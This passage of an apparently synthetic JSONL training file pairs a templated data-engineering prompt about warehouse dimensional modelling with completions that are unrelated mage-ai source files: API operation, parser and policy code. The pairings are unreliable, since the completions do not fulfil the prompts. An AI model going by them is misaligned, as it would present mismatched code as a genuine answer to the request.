self.query,\n                    'resource': self.resource,\n                    'resource_parent': self.resource_parent,\n                    'resource_parent_id': self.resource_parent_id,\n                    'user': {\n                        'id': self.user.id if self.user else None,\n                    },\n                }\n        except ApiError as err:\n            if (\n                err.code == 403\n                and self.user\n                and self.user.project_access == 0\n                and not self.user.roles\n            ):\n                if not REQUIRE_USER_PERMISSIONS:\n                    err.message = (\n                        'You don’t have access to this project. '\n                        + 'Please ask an admin or owner for permissions.'\n                    )\n\n            results_altered = self.__run_hooks_after(\n                condition=HookCondition.FAILURE,\n                error=self.__present_error(err),\n                metadata=metadata,\n                operation_resource=result,\n                payload=self.payload_mutated,\n                resource_parent=resource_parent,\n                **{\n                    resource_key: presented_init,\n                },\n            )\n            response['error'] = results_altered['error']\n\n            if settings.DEBUG:\n                raise err\n\n        db_connection.stop_cache()\n\n        return response\n\n    @property\n    def query(self) -> Dict:\n        if not self._query:\n            return {}\n\n        query = {}\n        for key, values in self._query.items():\n            query[key] = values\n            if isinstance(values, list):\n                arr = []\n                for v in values:\n                    try:\n                        v = v.decode()\n                    except (UnicodeDecodeError, AttributeError):\n                        pass\n\n                    if 'true' == v:\n                        v = True\n                    elif 'false' == v:\n                        v = False\n\n                    arr.append(v)\n                query[key] = arr\n\n        return query\n\n    @query.setter\n    def query(self, value):\n        self._query = value\n\n    def __run_hooks(\n        self,\n        operation_type: HookOperation,\n        stage: HookStage,\n        condition: HookCondition = None,\n        error: Dict = None,\n        meta: Dict = None,\n        metadata: Dict = None,\n        operation_resource: Union[BaseResource, Dict, List[BaseResource]] = None,\n        payload: Dict = None,\n        query: Dict = None,\n        resource: Dict = None,\n        resource_parent: Any = None,\n        resources: List[Dict] = None,\n    ) -> List[Hook]:\n        if FeatureUUID.GLOBAL_HOOKS not in self.__flags:\n            self.__flags[FeatureUUID.GLOBAL_HOOKS] = (\n                Project.is_feature_enabled_in_root_or_active_project(\n                    FeatureUUID.GLOBAL_HOOKS,\n                    context_data=self.context.data,\n                    user=self.user,\n                )\n            )\n\n        if not self.__flags[FeatureUUID.GLOBAL_HOOKS]:\n            return None\n\n        operation_types = [operation_type]\n        if HookOperation.UPDATE == operation_type:\n            operation_types.append(HookOperation.UPDATE_ANYWHERE)\n\n        try:\n            resource_parent_dict = None\n            if resource_parent and hasattr(resource_parent, '__dict__'):\n                resource_parent_dict = resource_parent.__dict__\n\n            global_hooks = GlobalHooks.load_from_file()\n            hooks = global_hooks.get_and_run_hooks(\n                operation_types,\n                EntityName(self.__classified_class()),\n                stage,\n                conditions=[condition] if condition else None,\n                error=error,\n                meta=meta,\n                metadata=metadata,\n                operation_resource=operation_resource,\n                payload=payload,\n                query=query,\n                resource=resource,\n                resource_id=self.pk,\n                resource_parent=resource_parent_dict,\n                resource_parent_id=self.resource_parent_id,\n                resource_parent_type=self.__resource_parent_entity_name(),\n                resources=resources,\n                user=dict(\n                    avatar=self.user.avatar,\n                    first_name=self.user.first_name,\n                    id=self.user.id,\n                    last_name=self.user.last_name,\n                    username=self.user.username,\n                )\n                if self.user\n                else None,\n            )\n        except Exception as err:\n            if is_debug():\n                raise err\n            hooks = []\n\n        try:\n            if hooks:\n                for hook in hooks or []:\n                    if hook.status and HookStrategy.RAISE == hook.status.strategy:\n                        raise Exception(hook.status.error)\n\n            return hooks\n        except Exception as err:\n            raise err\n\n    def __run_hooks_after(\n        self,\n        condition: HookCondition = None,\n        error: Dict = None,\n        metadata: Dict = None,\n        operation_resource: Union[BaseResource, List[BaseResource]] = None,\n        payload: Dict = None,\n        resource: Dict = None,\n        resource_parent: Any = None,\n        resources: List[Dict] = None,\n    ) -> Union[Dict, List[Dict]]:\n        hooks = self.__run_hooks(\n            condition=condition,\n            error=error,\n            meta=self.meta,\n            metadata=metadata,\n            operation_resource=operation_resource,\n            operation_type=HookOperation(self.action),\n            payload=payload,\n            query=self.query,\n            resource=resource,\n            resource_parent=resource_parent,\n            resources=resources,\n            stage=HookStage.AFTER,\n        )\n\n        if not hooks:\n            return dict(\n                error=error,\n                metadata=metadata,\n                resource=resource,\n                resources=resources,\n            )\n\n        for hook in hooks or []:\n            output = hook.output\n\n            if not output:\n                continue\n\n            if output.get('error'):\n                error = merge_dict(error, output.get('error') or {})\n\n            if output.get('metadata'):\n                metadata = merge_dict(metadata, output.get('metadata') or {})\n\n            if output.get('resource'):\n                output_resource = output.get('resource')\n                if isinstance(output_resource, dict):\n                    resource = CustomDict(merge_dict(resource or {}, output_resource or {}))\n                    resource.already_validated = False\n\n        return dict(\n            error=error,\n            metadata=metadata,\n            resource=resource,\n            resources=resources,\n        )\n\n    def __run_hooks_before(\n        self,\n        operation_resource: Union[BaseResource, Dict, List[BaseResource]] = None,\n        payload: Dict = None,\n        resource_parent: Any = None,\n        **kwargs,\n    ) -> Dict:\n        if not payload:\n            payload = {}\n\n        hooks = self.__run_hooks(\n            operation_type=HookOperation(self.action),\n            stage=HookStage.BEFORE,\n            meta=self.meta,\n            operation_resource=operation_resource,\n            payload=payload,\n            query=self.query,\n            resource_parent=resource_parent,\n        )\n\n        if not hooks:\n            return payload\n\n        for hook in hooks or []:\n            output = hook.output\n            if not output:\n                continue\n\n            if output.get('meta'):\n                value = output.get('meta') or {}\n                if isinstance(value, dict):\n                    self.meta = merge_dict(self.meta, value)\n\n            if output.get('payload'):\n                value = output.get('payload') or {}\n                if isinstance(value, dict):\n                    payload = merge_dict(payload, value)\n\n            if output.get('query'):\n                value = output.get('query') or {}\n                if isinstance(value, dict):\n                    self.query = merge_dict(self.query, value)\n\n        self.payload_mutated = payload\n\n        return payload\n\n    async def __executed_result(self) -> Union[BaseResource, Dict, List[BaseResource]]:\n        if self.action in [CREATE, LIST]:\n            return await self.__create_or_index()\n        elif self.action in [DELETE, DETAIL, UPDATE]:\n            return await self.__delete_show_or_update()\n\n    async def __create_or_index(self) -> Union[BaseResource, Dict, List[BaseResource]]:\n        updated_options = await self.__updated_options()\n\n        operation_resource = (None,)\n        payload = None\n        if CREATE == self.action:\n            payload = self.__payload_for_resource()\n            operation_resource = payload\n        payload = self.__run_hooks_before(\n            operation_resource=operation_resource,\n            payload=payload,\n            resource_parent=updated_options.get('parent_model'),\n            resource_parent_id=self.resource_parent_id,\n        )\n\n        policy = self.__policy_class()(None, self.user, **updated_options)\n        await policy.authorize_action(self.action)\n\n        parser = None\n        parser_class = self.__parser_class()\n        if parser_class:\n            parser = parser_class(\n                resource=None,\n                current_user=self.user,\n                policy=policy,\n                **updated_options,\n            )\n\n        if CREATE == self.action:\n\n            def _build_authorize_attributes(parsed_value: Any, policy=policy) -> Callable:\n                return policy.authorize_attributes(\n                    WRITE,\n                    parsed_value.keys(),\n                    **parsed_value,\n                )\n\n            if parser:\n                payload = await parser.parse_write_attributes_and_authorize(\n                    payload,\n                    _build_authorize_attributes,\n                    **updated_options,\n                )\n            else:\n                await _build_authorize_attributes(payload)\n\n            options = updated_options.copy()\n            options.pop('payload', None)\n\n            result = await self.__resource_class().process_create(\n                payload,\n                self.user,\n                result_set_from_external=policy.result_set(),\n                **options,\n            )\n\n            return result\n        elif LIST == self.action:\n\n            def _build_authorize_query(\n                parsed_value: Any,\n                policy=policy,\n                updated_options=updated_options,\n                **_kwargs,\n            ) -> Callable:\n                return policy.authorize_query(\n                    parsed_value,\n                    **ignore_keys(\n                        updated_options,\n                        [\n                            'query',\n                        ],\n                    ),\n                )\n\n            if parser:\n                value_parsed, parser_found, error = await parser.parse_query_and_authorize(\n                    self.query,\n                    _build_authorize_query,\n                    **updated_options,\n                )\n                self.query = value_parsed\n            else:\n                await _build_authorize_query(self.query)\n\n            options = updated_options.copy()\n            options.pop('meta', None)\n            options.pop('query', None)\n\n            return await self.__resource_class().process_collection(\n                self.query,\n                self.meta,\n                self.user,\n                result_set_from_external=policy.result_set(),\n                **options,\n            )\n\n    async def __delete_show_or_update(self) -> BaseResource:\n        updated_options = await self.__updated_options()\n\n        res = await self.__resource_class().process_member(\n            self.pk,\n            self.user,\n            **updated_options,\n        )\n\n        payload = None\n        if UPDATE == self.action:\n            payload = self.__payload_for_resource()\n        payload = self.__run_hooks_before(\n            payload=payload,\n            operation_resource=res,\n        )\n\n        policy = self.__policy_class()(res, self.user, **updated_options)\n        await policy.authorize_action(self.action)\n\n        parser = None\n        parser_class = self.__parser_class()\n        if parser_class:\n            parser = parser_class(\n                resource=res,\n                current_user=self.user,\n                policy=policy,\n                **updated_options,\n            )\n\n        if DELETE == self.action:\n            await res.process_delete(**updated_options)\n        elif DETAIL == self.action:\n\n            def _build_authorize_query(\n                parsed_value: Any,\n                policy=policy,\n                updated_options=updated_options,\n                **_kwargs,\n            ) -> Callable:\n                return policy.authorize_query(\n                    parsed_value,\n                    **ignore_keys(\n                        updated_options,\n                        [\n                            'query',\n                        ],\n                    ),\n                )\n\n            if parser:\n                value_parsed, parser_found, error = await parser.parse_query_and_authorize(\n                    self.query,\n                    _build_authorize_query,\n                    return_on_first_failure=True,\n                    **updated_options,\n                )\n\n                if error:\n                    if parser_found:\n                        self.query = value_parsed\n                        res = await self.__resource_class().process_member(\n                            self.pk,\n                            self.user,\n                            **merge_dict(updated_options, dict(query=self.query)),\n                        )\n                        policy = self.__policy_class()(res, self.user, **updated_options)\n                        await policy.authorize_query(\n                            self.query,\n                            **ignore_keys(\n                                updated_options,\n                                [\n                                    'query',\n                                ],\n                            ),\n                        )\n                    else:\n                        raise error\n            else:\n                await _build_authorize_query(self.query)\n\n        elif UPDATE == self.action:\n\n            def _build_authorize_attributes(parsed_value: Any, policy=policy) -> Callable:\n                return policy.authorize_attributes(\n                    WRITE,\n                    parsed_value.keys(),\n                    **parsed_value,\n                )\n\n            if parser:\n                payload = await parser.parse_write_attributes_and_authorize(\n                    payload,\n                    _build_authorize_attributes,\n                    **updated_options,\n                )\n            else:\n                await _build_authorize_attributes(payload)\n\n            def _build_authorize_query(\n                parsed_value: Any,\n                policy=policy,\n                updated_options=updated_options,\n                **_kwargs,\n            ) -> Callable:\n                return policy.authorize_query(\n                    parsed_value,\n                    **ignore_keys(\n                        updated_options,\n                        [\n                            'query',\n                        ],\n                    ),\n                )\n\n            if parser:\n                value_parsed, parser_found, error = await parser.parse_query_and_authorize(\n                    self.query,\n                    _build_authorize_query,\n                    **updated_options,\n                )\n                self.query = value_parsed\n            else:\n                await _build_authorize_query(self.query, **updated_options)\n\n            options = merge_dict(updated_options.copy(), dict(query=self.query))\n            options.pop('payload', None)\n\n            await res.process_update(payload, **options)\n\n        return res\n\n    def __present_error(self, error):\n        return self.__monitor_class()(\n            self.resource,\n            self.user,\n            error,\n            **merge_dict(\n                self.__combined_options(),\n                dict(\n                    operation=self.action,\n                    resource_parent_id=self.resource_parent_id,\n                    resource_parent=self.resource_parent,\n                    resource_id=self.pk,\n                ),\n            ),\n        ).present()\n\n    def __classified_class(self):\n        parent_resource_class = self.__resource_parent_class()\n        if parent_resource_class:\n            child_resource_class = parent_resource_class.get_child_resource_class(self.resource)\n            if child_resource_class:\n                return child_resource_class.model_name()\n\n        return classify(self.__resource_name_singular())\n\n    def __resource_name_singular(self):\n        return singularize(self.resource)\n\n    def __monitor_class(self):\n        try:\n            return getattr(\n                importlib.import_module(\n                    'mage_ai.api.monitors.{}Monitor'.format(self.__classified_class())\n                ),\n                '{}Monitor'.format(self.__classified_class()),\n            )\n        except ModuleNotFoundError:\n            return BaseMonitor\n\n    def __parser_class(self) -> Union[BaseParser, None]:\n        klass = self.__classified_class()\n        module_name = f'mage_ai.api.parsers.{klass}Parser'\n        class_name = f'{klass}Parser'\n\n        try:\n            return getattr(importlib.import_module(module_name), class_name)\n        except ModuleNotFoundError:\n            return None\n\n    def __policy_class(self):\n        return getattr(\n            importlib.import_module(\n                'mage_ai.api.policies.{}Policy'.format(self.__classified_class())\n            ),\n            '{}Policy'.format(self.__classified_class()),\n        )\n\n    def __presenter_class(self):\n        return getattr(\n            importlib.import_module(\n                'mage_ai.api.presenters.{}Presenter'.format(self.__classified_class())\n            ),\n            '{}Presenter'.format(self.__classified_class()),\n        )\n\n    def __resource_class(self):\n        return getattr(\n            importlib.import_module(\n                'mage_ai.api.resources.{}Resource'.format(self.__classified_class())\n            ),\n            '{}Resource'.format(self.__classified_class()),\n        )\n\n    def __resource_parent_entity_name(self) -> str:\n        if self.resource_parent:\n            return classify(singularize(self.resource_parent))\n\n    def __resource_parent_class(self):\n        entity_name = self.__resource_parent_entity_name()\n        if entity_name:\n            return getattr(\n                importlib.import_module('mage_ai.api.resources.{}Resource'.format(entity_name)),\n                '{}Resource'.format(entity_name),\n            )\n\n    async def __parent_model(self):\n        if self.resource_parent_id:\n            parent_resource_class = self.__resource_parent_class()\n            if parent_resource_class:\n                try:\n                    model = parent_resource_class.get_model(\n                        self.resource_parent_id,\n                        context_data=self.context.data,\n                        query=self.query,\n                        resource_class=self.__resource_class(),\n                        resource_id=self.pk,\n                        user=self.user,\n                    )\n                    if inspect.isawaitable(model):\n                        model = await model\n                    return model\n                except DoesNotExistError:\n                    raise ApiError(ApiError.RESOURCE_NOT_FOUND)\n\n    def __combined_options(self):\n        if not self.__combined_options_attr:\n            self.__combined_options_attr = {\n                'context': self.context,\n                'context_data': self.context.data,\n                'meta': self.meta,\n                'options': self.options,\n                'payload': self.payload,\n                'query': self.query,\n            }\n        return self.__combined_options_attr\n\n    def __payload_for_resource(self):\n        payload = self.payload.get(self.__resource_name_singular(), {})\n\n        if self.files and self.files.get(FILE_KEY_NAME):\n            payload_prev = ignore_keys(self.payload, [FILE_KEY_NAME])\n            payload[FILE_KEY_NAME] = self.files.get(FILE_KEY_NAME)\n            payload.update(payload_prev)\n\n        for key in self.__resource_class().datetime_keys:\n            if payload.get(key) is not None:\n                if type(payload[key]) is str:\n                    payload[key] = dateutil.parser.parse(payload[key])\n\n        # Inject any cookies declared by the resource into the payload\n        # - expecting a list of cookie names\n        # - payload keys are contructed as COOKIE_PREFIX + <cookie_name>\n        cookie_names = self.__resource_class().cookie_names\n        if len(cookie_names) > 0:\n            # Parse cookies\n            cookies = None\n            cookie_header = self.headers.get('Cookie')\n            if cookie_header is not None:\n                from http.cookies import SimpleCookie\n\n                cookies = SimpleCookie()\n                cookies.load(cookie_header)\n            # Handle each cookie:\n            # - remove any matching name from incoming payload, for security\n            # - inject cookie values (if available)\n            for cookie_name in cookie_names:\n                payload_key = COOKIE_PREFIX + cookie_name\n                payload.pop(payload_key, None)\n                cookie = None\n                if cookies is not None:\n                    cookie = cookies.get(cookie_name)\n                if cookie is not None:\n                    payload[payload_key] = cookie.value\n\n        return payload\n\n    async def __present_results(self, results):\n        updated_options = await self.__updated_options()\n        data = updated_options.copy()\n        data.update({'format': self.__presentation_format()})\n        return await self.__presenter_class().present_resource(results, self.user, **data)\n\n    def __presentation_format(self):\n        if not self.__presentation_format_attr:\n            self.__presentation_format_attr = (self.meta or {}).get(META_KEY_FORMAT, self.action)\n        return self.__presentation_format_attr\n\n    async def __updated_options(self):\n        if not self.__updated_options_attr:\n            self.__updated_options_attr = self.__combined_options().copy()\n            self.__updated_options_attr.update({\n                'api_operation_action': self.action,\n                'oauth_client': self.oauth_client,\n                'oauth_token': self.oauth_token,\n                'parent_model': await self.__parent_model(),\n            })\n            self.__updated_options_attr.update(self.headers)\n        return self.__updated_options_attr\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/operations/base.py", "language": "python", "complexity": "complex", "star_count": 8424, "quality_score": 0.8799999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import inspect\nfrom collections.abc import Iterable\nfrom typing import Any, Callable, Dict, List, Tuple, Union\n\nfrom mage_ai.api.constants import AuthorizeStatusType\nfrom mage_ai.api.errors import ApiError\nfrom mage_ai.api.oauth_scope import OauthScope, OauthScopeType\nfrom mage_ai.api.operations.constants import OperationType\nfrom mage_ai.api.policies.BasePolicy import BasePolicy\nfrom mage_ai.api.resources.BaseResource import BaseResource\nfrom mage_ai.orchestration.db.models.oauth import User\n\n\nclass BaseParser:\n    query_parsers = {}\n    read_parsers = {}\n    write_parsers = {}\n\n    def __init__(\n        self,\n        resource: BaseResource,\n        current_user: User,\n        policy: BasePolicy,\n        **kwargs,\n    ):\n        self.current_user = current_user\n        self.options = kwargs\n        self.resource = resource\n        if isinstance(resource, Iterable):\n            self.resources = resource\n        else:\n            self.resources = [resource]\n        self.policy = policy\n\n    @classmethod\n    def query_parser(self, query_parameter: str) -> Dict:\n        if not self.query_parsers.get(self.__name__):\n            self.query_parsers[self.__name__] = {}\n        return self.query_parsers[self.__name__].get(query_parameter)\n\n    @classmethod\n    def read_parser(self, resource_attribute: str) -> Dict:\n        if not self.read_parsers.get(self.__name__):\n            self.read_parsers[self.__name__] = {}\n        return self.read_parsers[self.__name__].get(resource_attribute)\n\n    @classmethod\n    def write_parser(self, resource_attribute: str) -> Dict:\n        if not self.write_parsers.get(self.__name__):\n            self.write_parsers[self.__name__] = {}\n        return self.write_parsers[self.__name__].get(resource_attribute)\n\n    @classmethod\n    def parse_query(\n        self,\n        parser: Callable[['BaseParser', Any, Union[ApiError], Dict], Any],\n        on_action: Union[List[OperationType], OperationType] = None,\n        on_authorize_status: Union[List[AuthorizeStatusType], AuthorizeStatusType] = None,\n        scopes: List[OauthScopeType] = None,\n    ) -> None:\n        if not self.query_parsers.get(self.__name__):\n            self.query_parsers[self.__name__] = {}\n\n        actions = on_action or [OperationType.ALL.value]\n        if not isinstance(actions, list):\n            actions = [actions]\n\n        authorize_statuses = on_authorize_status or [AuthorizeStatusType.ALL.value]\n        if not isinstance(authorize_statuses, list):\n            authorize_statuses = [authorize_statuses]\n\n        for scope in (scopes or [OauthScopeType.ALL]):\n            if not self.query_parsers[self.__name__].get(scope):\n                self.query_parsers[self.__name__][scope] = {}\n\n            for action in actions:\n                if not self.query_parsers[self.__name__][scope].get(action):\n                    self.query_parsers[self.__name__][scope][action] = {}\n\n                for authorize_status in authorize_statuses:\n                    self.query_parsers[self.__name__][scope][action][authorize_status] = parser\n\n    @classmethod\n    def parse_read(\n        self,\n        parser: Callable[['BaseParser', Any, Union[ApiError, Dict]], Any],\n        on_action: Union[List[OperationType], OperationType] = None,\n        on_authorize_status: Union[List[AuthorizeStatusType], AuthorizeStatusType] = None,\n        scopes: List[OauthScopeType] = None,\n    ) -> None:\n        if not self.read_parsers.get(self.__name__):\n            self.read_parsers[self.__name__] = {}\n\n        actions = on_action or [OperationType.ALL.value]\n        if not isinstance(actions, list):\n            actions = [actions]\n\n        authorize_statuses = on_authorize_status or [AuthorizeStatusType.ALL.value]\n        if not isinstance(authorize_statuses, list):\n            authorize_statuses = [authorize_statuses]\n\n        for scope in (scopes or [OauthScopeType.ALL]):\n            if not self.read_parsers[self.__name__].get(scope):\n                self.read_parsers[self.__name__][scope] = {}\n\n            for action in actions:\n                if not self.read_parsers[self.__name__][scope].get(action):\n                    self.read_parsers[self.__name__][scope][action] = {}\n\n                for authorize_status in authorize_statuses:\n                    self.read_parsers[self.__name__][scope][action][authorize_status] = parser\n\n    @classmethod\n    def parse_write(\n        self,\n        parser: Callable[['BaseParser', Any, Union[ApiError, Dict]], Any],\n        on_action: Union[List[OperationType], OperationType] = None,\n        on_authorize_status: Union[List[AuthorizeStatusType], AuthorizeStatusType] = None,\n        scopes: List[OauthScopeType] = None,\n    ) -> None:\n        if not self.write_parsers.get(self.__name__):\n            self.write_parsers[self.__name__] = {}\n\n        actions = on_action or [OperationType.ALL.value]\n        if not isinstance(actions, list):\n            actions = [actions]\n\n        authorize_statuses = on_authorize_status or [AuthorizeStatusType.ALL.value]\n        if not isinstance(authorize_statuses, list):\n            authorize_statuses = [authorize_statuses]\n\n        for scope in (scopes or [OauthScopeType.ALL]):\n            if not self.write_parsers[self.__name__].get(scope):\n                self.write_parsers[self.__name__][scope] = {}\n\n            for action in actions:\n                if not self.write_parsers[self.__name__][scope].get(action):\n                    self.write_parsers[self.__name__][scope][action] = {}\n\n                for authorize_status in authorize_statuses:\n                    self.write_parsers[self.__name__][scope][action][authorize_status] = parser\n\n    async def parse_query_and_authorize(\n        self,\n        value: Any,\n        build_authorize: Callable,\n        return_on_first_failure: bool = False,\n        **kwargs,\n    ) -> Tuple[Any, bool, ApiError]:\n        authorize_status = None\n        error = None\n\n        try:\n            await build_authorize(value)\n            authorize_status = AuthorizeStatusType.SUCCEEDED\n        except ApiError as err:\n            error = err\n            authorize_status = AuthorizeStatusType.FAILED\n\n        value_parsed, parser_found = await self.__parse(\n            self.query_parsers.get(self.__class__.__name__) or {},\n            value,\n            authorize_status,\n            error=error,\n            **kwargs,\n        )\n\n        if error and return_on_first_failure:\n            return value_parsed, parser_found, error\n\n        if error:\n            if parser_found:\n                await build_authorize(value_parsed)\n            else:\n                raise error\n\n        return value_parsed, parser_found, None\n\n    async def parse_read_attributes_and_authorize(\n        self,\n        value: Any,\n        build_authorize: Callable,\n        **kwargs,\n    ) -> Any:\n        authorize_status = None\n        error = None\n\n        try:\n            await build_authorize(value)\n            authorize_status = AuthorizeStatusType.SUCCEEDED\n        except ApiError as err:\n            error = err\n            authorize_status = AuthorizeStatusType.FAILED\n\n        value_parsed, parser_found = await self.__parse(\n            self.read_parsers.get(self.__class__.__name__) or {},\n            value,\n            authorize_status,\n            **kwargs,\n        )\n\n        if error:\n            if parser_found:\n                await build_authorize(value_parsed)\n            else:\n                raise error\n\n        return value_parsed\n\n    async def parse_write_attributes_and_authorize(\n        self,\n        value: Any,\n        build_authorize: Callable,\n        **kwargs,\n    ) -> Any:\n        authorize_status = None\n        error = None\n\n        try:\n            await build_authorize(value)\n            authorize_status = AuthorizeStatusType.SUCCEEDED\n        except ApiError as err:\n            error = err\n            authorize_status = AuthorizeStatusType.FAILED\n\n        value_parsed, parser_found = await self.__parse(\n            self.write_parsers.get(self.__class__.__name__) or {},\n            value,\n            authorize_status,\n            **kwargs,\n        )\n\n        if error:\n            if parser_found:\n                await build_authorize(value_parsed)\n            else:\n                raise error\n\n        return value_parsed\n\n    async def __parse(\n        self,\n        parser_mapping: Dict,\n        value: Any,\n        authorize_status: AuthorizeStatusType,\n        error: ApiError = None,\n        **kwargs,\n    ) -> Tuple[Any, bool]:\n        api_operation_action = self.options.get('api_operation_action') or \\\n            kwargs.get('api_operation_action') or \\\n            OperationType.ALL\n\n        parser = None\n        parser_scope = parser_mapping.get(self.__current_scope()) or {}\n        if parser_scope:\n            parser_action = parser_scope.get(\n                api_operation_action,\n            ) or parser_scope.get(OperationType.ALL)\n            if parser_action:\n                parser = parser_action.get(\n                    authorize_status,\n                ) or parser_action.get(AuthorizeStatusType.ALL)\n\n        if not parser:\n            return value, False\n\n        value_parsed = parser(self, value, authorize_status=authorize_status, error=error, **kwargs)\n\n        if value_parsed and inspect.isawaitable(value_parsed):\n            value_parsed = await value_parsed\n\n        return value_parsed, True\n\n    def __current_scope(self) -> OauthScope:\n        return self.policy.current_scope()\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/parsers/BaseParser.py", "language": "python", "complexity": "complex", "star_count": 8424, "quality_score": 0.85, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from typing import Dict\n\nfrom mage_ai.api.constants import AuthorizeStatusType\nfrom mage_ai.api.oauth_scope import OauthScopeType\nfrom mage_ai.api.operations.constants import OperationType\nfrom mage_ai.api.parsers.BaseParser import BaseParser\nfrom mage_ai.api.policies.PipelineSchedulePolicy import (\n    READABLE_ATTRIBUTES_FOR_PIPELINE_INTERACTIONS,\n    WRITABLE_ATTRIBUTES_FOR_PIPELINE_INTERACTIONS,\n)\nfrom mage_ai.data_preparation.models.project import Project\nfrom mage_ai.data_preparation.models.project.constants import FeatureUUID\nfrom mage_ai.shared.hash import extract\n\n\nclass PipelineScheduleParser(BaseParser):\n    pass\n\n\nasync def parse_read(parser, value: Dict, **kwargs) -> Dict:\n    return extract(value, READABLE_ATTRIBUTES_FOR_PIPELINE_INTERACTIONS)\n\n\nasync def parse_read_update(parser, _value: Dict, **kwargs) -> Dict:\n    return {}\n\n\nasync def parse_write(\n    parser,\n    value: Dict,\n    authorize_status: AuthorizeStatusType = None,\n    **kwargs,\n) -> Dict:\n    if AuthorizeStatusType.FAILED == authorize_status:\n        parsed_value = extract(value or {}, WRITABLE_ATTRIBUTES_FOR_PIPELINE_INTERACTIONS)\n    else:\n        parsed_value = (value or {}).copy()\n\n    pipeline = parser.policy.parent_model()\n    if not pipeline:\n        pipeline = parser.policy.resource.pipeline\n\n    if Project(repo_config=pipeline.repo_config if pipeline else None).is_feature_enabled(\n        FeatureUUID.INTERACTIONS,\n    ):\n        pipeline_interaction = (parser.policy.result_set().context.data or {}).get(\n            'pipeline_interactions',\n            {},\n        ).get(pipeline.uuid)\n\n        if pipeline_interaction:\n            variables = parsed_value.get('variables')\n            if pipeline_interaction and variables:\n                variables_allowed = await pipeline_interaction.variables()\n                parsed_value['variables'] = extract(\n                    variables or {},\n                    (variables_allowed or {}).keys(),\n                )\n\n    return parsed_value\n\n\nasync def parse_write_update(parser, value: Dict, **kwargs) -> Dict:\n    return extract(value, ['status'])\n\n\nPipelineScheduleParser.parse_read(\n    parser=parse_read,\n    on_action=[\n        OperationType.CREATE,\n    ],\n    on_authorize_status=[\n        AuthorizeStatusType.FAILED,\n    ],\n    scopes=[\n        OauthScopeType.CLIENT_PRIVATE,\n    ],\n)\n\n\nPipelineScheduleParser.parse_read(\n    parser=parse_read_update,\n    on_action=[\n        OperationType.UPDATE,\n    ],\n    on_authorize_status=[\n        AuthorizeStatusType.FAILED,\n    ],\n    scopes=[\n        OauthScopeType.CLIENT_PRIVATE,\n    ],\n)\n\n\nPipelineScheduleParser.parse_write(\n    parser=parse_write,\n    on_action=[\n        OperationType.CREATE,\n    ],\n    on_authorize_status=[\n        AuthorizeStatusType.FAILED,\n        AuthorizeStatusType.SUCCEEDED,\n    ],\n    scopes=[\n        OauthScopeType.CLIENT_PRIVATE,\n    ],\n)\n\n\nPipelineScheduleParser.parse_write(\n    parser=parse_write_update,\n    on_action=[\n        OperationType.UPDATE,\n    ],\n    on_authorize_status=[\n        AuthorizeStatusType.FAILED,\n    ],\n    scopes=[\n        OauthScopeType.CLIENT_PRIVATE,\n    ],\n)\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/parsers/PipelineScheduleParser.py", "language": "python", "complexity": "medium", "star_count": 8424, "quality_score": 0.85, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from mage_ai.api.oauth_scope import OauthScope\nfrom mage_ai.api.operations import constants\nfrom mage_ai.api.policies.BasePolicy import BasePolicy\nfrom mage_ai.api.presenters.BackfillPresenter import BackfillPresenter\nfrom mage_ai.orchestration.constants import Entity\n\n\nclass BackfillPolicy(BasePolicy):\n    @property\n    def entity(self):\n        parent_model = self.options.get('parent_model')\n        if parent_model:\n            return Entity.PIPELINE, parent_model.uuid\n\n        return super().entity\n\n\nBackfillPolicy.allow_actions([\n    constants.DETAIL,\n    constants.LIST,\n], scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], condition=lambda policy: policy.has_at_least_viewer_role())\n\nBackfillPolicy.allow_actions([\n    constants.CREATE,\n    constants.DELETE,\n    constants.UPDATE,\n], scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], condition=lambda policy: policy.has_at_least_editor_role())\n\nBackfillPolicy.allow_read([\n    'pipeline_run_dates',\n    'run_status_counts',\n    'total_run_count',\n] + BackfillPresenter.default_attributes, scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], on_action=[\n    constants.DETAIL,\n    constants.LIST,\n], condition=lambda policy: policy.has_at_least_viewer_role())\n\nBackfillPolicy.allow_read([] + BackfillPresenter.default_attributes, scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], on_action=[\n    constants.CREATE,\n    constants.UPDATE,\n    constants.DELETE,\n], condition=lambda policy: policy.has_at_least_editor_role())\n\nBackfillPolicy.allow_write([\n    'name',\n], scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], on_action=[\n    constants.CREATE,\n], condition=lambda policy: policy.has_at_least_editor_role())\n\nBackfillPolicy.allow_write([\n    'block_uuid',\n    'end_datetime',\n    'interval_type',\n    'interval_units',\n    'name',\n    'settings',\n    'start_datetime',\n    'status',\n    'variables',\n], scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], on_action=[\n    constants.UPDATE,\n], condition=lambda policy: policy.has_at_least_editor_role())\n\nBackfillPolicy.allow_query([\n    'include_preview_runs',\n    'include_run_count',\n], scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], on_action=[\n    constants.DETAIL,\n], condition=lambda policy: policy.has_at_least_viewer_role())\n\nBackfillPolicy.allow_query([\n    'include_run_count',\n    'pipeline_uuid',\n], scopes=[\n    OauthScope.CLIENT_PRIVATE,\n], on_action=[\n    constants.LIST,\n], condition=lambda policy: policy.has_at_least_viewer_role())\n", "metadata": {"source": 